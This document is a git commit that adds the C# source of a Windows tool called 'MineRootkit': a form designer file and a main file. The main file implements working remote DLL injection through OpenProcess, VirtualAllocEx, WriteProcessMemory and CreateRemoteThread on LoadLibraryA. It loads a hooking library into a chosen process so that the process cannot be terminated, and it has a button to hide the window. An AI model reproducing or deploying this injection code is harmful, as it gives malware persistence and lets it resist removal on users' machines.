648c36fe234b25b984ff069354efabeab3e81297
AhmedMinegames <90452585+AhmedMinegames@users.noreply.github.com>
2021-11-11 18:59:32 -0800

    Add files via upload

---
+++ MineRootkit/MineRootkit/Main.Designer.cs
@@ -0,0 +1,104 @@
+﻿
+namespace MineRootkit
+{
+    partial class Main
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Main));
+            this.label1 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(12, 21);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(155, 20);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Process ID To Hook:";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(173, 18);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(615, 26);
+            this.textBox1.TabIndex = 1;
+            // 
+            // button1
+            // 
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Location = new System.Drawing.Point(204, 82);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(359, 50);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "Prevent Termination For Current Process";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button2.Location = new System.Drawing.Point(587, 93);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(201, 39);
+            this.button2.TabIndex = 3;
+            this.button2.Text = "Hide This Window";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // Main
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(9F, 20F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(800, 144);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Main";
+            this.Text = "MineRootkit";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Main_FormClosing);
+            this.Load += new System.EventHandler(this.Main_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+    }
+}
+
---
+++ MineRootkit/MineRootkit/Main.cs
@@ -0,0 +1,117 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace MineRootkit
+{
+    public partial class Main : Form
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr OpenProcess(long Access, bool Inherit, int PID);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr Handle);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lib);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr Module, string Function);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool WriteProcessMemory(IntPtr ProcHandle, IntPtr BaseAddress, string Buffer, int size, int NumOfBytes);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr VirtualAllocEx(IntPtr ProcessHandle, [In, Optional] IntPtr Address, int Size, uint AllocationType, uint Protection);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr CreateRemoteThread(IntPtr ProcessHandle, IntPtr ThreadAttributes, uint StackSize, IntPtr StartAddress, IntPtr Parameter, uint CreationFlags, [Out] uint ThreadID);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint WaitForSingleObject(IntPtr Handle, uint TimeInMilli);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool VirtualFreeEx(IntPtr ProcessHandle, IntPtr Address, int Size, uint FreeType);
+
+        public Main()
+        {
+            InitializeComponent();
+        }
+
+        private unsafe bool IsLoadLibraryAHooked()
+        {
+            return false;
+        }
+
+        public static unsafe int strlen(string s)
+        {
+            int length = 0;
+            fixed (char* pStr = s)
+            {
+                length = *(((int*)pStr) - 1);
+            }
+            return length;
+        }
+
+        private unsafe bool InjectHookingLibrary(string DllPath, int PID)
+        {
+            IntPtr ProcessToInjectDllInto = OpenProcess(0x000F0000L | 0x00100000L | 0xFFFF, false, PID);
+            if(ProcessToInjectDllInto != IntPtr.Zero)
+            {
+                IntPtr LoadLibraryA = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+                IntPtr Allocation = VirtualAllocEx(ProcessToInjectDllInto, IntPtr.Zero, strlen(DllPath), 0x00001000 | 0x00002000, 0x04);
+                WriteProcessMemory(ProcessToInjectDllInto, Allocation, DllPath, strlen(DllPath), 0);
+                IntPtr RemoteThread = CreateRemoteThread(ProcessToInjectDllInto, IntPtr.Zero, 0, LoadLibraryA, Allocation, 0, 0);
+                WaitForSingleObject(RemoteThread, 0xFFFFFFF);
+                VirtualFreeEx(ProcessToInjectDllInto, Allocation, strlen(DllPath), 0x00008000);
+                CloseHandle(RemoteThread);
+                CloseHandle(ProcessToInjectDllInto);
+                return true;
+            }
+            return false;
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrEmpty(textBox1.Text))
+            {
+                MessageBox.Show("Please Enter Process PID.", "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
+            }
+            else
+            {
+                if (InjectHookingLibrary(Environment.CurrentDirectory + @"\MineRootkitHooking.dll", Convert.ToInt32(textBox1.Text)))
+                {
+                    MessageBox.Show("Successfully Injected The Hooking Library.", "Success", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
+                }
+                else
+                {
+                    MessageBox.Show("Error While Injecting The Hooking Dll.", "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            this.Hide();
+        }
+
+        private void Main_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void Main_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Environment.Exit(0);
+        }
+    }
+}
